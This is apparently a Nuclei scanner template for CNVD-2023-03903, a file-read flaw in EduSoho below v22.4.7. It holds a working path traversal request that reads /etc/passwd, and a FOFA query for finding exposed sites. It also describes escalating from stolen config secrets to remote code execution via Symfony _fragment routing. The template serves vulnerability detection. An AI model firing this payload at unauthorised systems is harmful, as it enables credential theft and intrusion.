http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: content_type
    type: word
    words:
    - text/csv
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CNVD-2023-03903
info:
  author: s4e-io
  description: 'The edusoho education and training system <v22.4.7 has unauthorized
    file reading vulnerability. Through this vulnerability, an attacker can read the
    contents of the config/parameters.yml file and obtain sensitive information such
    as the secret value saved in the file and database account password. After the
    secret value is obtained, an attacker can implement RCE with symfony _fragment
    routing.

    '
  metadata:
    fofa-query: title="Powered By EduSoho" || body="Powered by <a href=\"http://www.edusoho.com/\"
      target=\"_blank\">EduSoho" || (body="Powered By EduSoho" && body="var app")
    max-request: 1
    product: edusoho
    vendor: hagzhou-kuozhi-network-technology
    verified: true
  name: EduSoho < v22.4.7 - Local File Inclusion
  reference:
  - https://blog.csdn.net/qq_41904294/article/details/135007351
  - https://github.com/gobysec/GobyVuls/blob/master/CNVD-2023-03903.md
  severity: high
  tags: cnvd,cnvd2023,lfi,edushoho,vuln
